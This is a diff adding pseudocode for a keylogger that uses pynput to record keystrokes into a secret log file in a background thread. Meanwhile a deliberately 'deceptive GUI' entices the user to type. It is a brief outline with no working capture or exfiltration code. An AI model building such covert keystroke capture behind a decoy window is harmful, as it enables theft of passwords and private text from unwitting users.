@@ -1,0 +1,32 @@
+#This is the pseudocode for Keylogger.py
+#Implements a keylogger using pynput and a deceptive GUI (UserInterface from logging_tools)
+
+TRY:
+    IMPORT pynput.keyboard
+CATCH ImportError:
+    RAISE error message about installing pynput
+
+IMPORT KeyLogger and UserInterface from logging_tools
+
+FUNCTION main():
+    # 1. Initialize components
+    CREATE logger_object from KeyLogger class with filename "secret_log.txt"
+    CREATE ui_object from UserInterface class
+    
+    # 2. Define listener behavior
+    DEFINE on_press(key) function:
+        CALL logger_object.process_key(key)
+    
+    # 3. Start keyboard listener in background thread (non-blocking)
+    CREATE listener using keyboard.Listener with on_press callback
+    START listener in background
+    
+    # 4. Display GUI window (blocks main thread until closed)
+    CALL ui_object.start_enticement()
+    
+    # 5. Cleanup after UI closes
+    STOP listener
+    PRINT "Session ended. Data saved to public_notes.txt and secret_log.txt."
+
+IF __name__ == "__main__":
+    CALL main()
